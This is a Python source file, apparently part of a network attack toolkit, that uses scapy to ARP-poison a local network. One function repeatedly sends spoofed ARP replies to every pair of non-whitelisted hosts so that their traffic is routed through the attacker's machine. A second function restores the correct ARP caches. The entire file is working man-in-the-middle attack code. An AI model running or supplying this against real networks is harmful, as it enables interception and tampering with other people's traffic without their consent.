# Standard libraries
from threading import Lock
from time import sleep

# Additional libraries
from scapy.arch import get_if_hwaddr
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import sendp


def poison(interface: str, settings: dict):
    print('Continuously ARP poisoning hosts on ' + interface)
    hosts_dictionary: dict = settings['hosts'][interface]
    whitelist_iter: iter = settings['whitelist poisoned hosts'][interface]
    lock: Lock = settings['locks'][interface]
    attacker_mac = get_if_hwaddr(interface)

    def send_arp_poison(dst_mac: str, dst_ip: str, src_ip: str):
        arp = Ether() / ARP()
        arp[Ether].src = attacker_mac
        arp[Ether].dst = dst_mac
        arp[ARP].hwsrc = attacker_mac
        arp[ARP].psrc = src_ip
        arp[ARP].hwdst = dst_mac
        arp[ARP].pdst = dst_ip
        arp[ARP].op = 'is-at'
        if settings['show debug']:
            arp.show()
        sendp(arp, iface=interface, verbose=settings['show debug'])
        if settings['show arp poison']:
            print('Poisoned ARP cache of ' + dst_ip + ' pretending to be ' + src_ip)

    while not settings['interrupted']:
        # Find all combinations of hosts
        lock.acquire()
        for host_mac in hosts_dictionary:
            if host_mac not in whitelist_iter:
                for host2_mac in hosts_dictionary:
                    if host2_mac not in whitelist_iter:
                        # Check if the two hosts are not identical
                        if host_mac != host2_mac:
                            # Find all IP addresses of hosts
                            for host_ip in hosts_dictionary[host_mac]:
                                for host2_ip in hosts_dictionary[host2_mac]:
                                    # Poison them one way
                                    # Second way is included in another iteration
                                    send_arp_poison(host_mac, host_ip, host2_ip)
        lock.release()
        sleep(settings['arp poison frequency'])


def restore(interface, settings):
    print('Restoring ARP caches on ' + interface)
    hosts_dictionary = settings['hosts'][interface]
    lock = settings['locks'][interface]
    attacker_mac = get_if_hwaddr(interface)

    def send_arp_restore(dst_mac, dst_ip, src_mac, src_ip):
        arp = Ether() / ARP()
        arp[Ether].src = attacker_mac
        arp[Ether].dst = dst_mac
        arp[ARP].hwsrc = src_mac
        arp[ARP].psrc = src_ip
        arp[ARP].hwdst = dst_mac
        arp[ARP].pdst = dst_ip
        arp[ARP].op = 'is-at'
        if settings['show debug']:
            arp.show()
        sendp(arp, iface=interface, verbose=settings['show debug'])
        if settings['show arp poison']:
            print('Restored ARP cache of ' + dst_ip + ', not pretending to be ' + src_ip)

    lock.acquire()
    for host_mac in hosts_dictionary:
        for host2_mac in hosts_dictionary:
            # Check if the two hosts are not identical
            if host_mac != host2_mac:
                # Find all IP addresses of hosts
                for host_ip in hosts_dictionary[host_mac]:
                    for host2_ip in hosts_dictionary[host2_mac]:
                        # Restore them one way
                        # Second way is included in another iteration
                        send_arp_restore(host_mac, host_ip, host2_mac, host2_ip)
    lock.release()
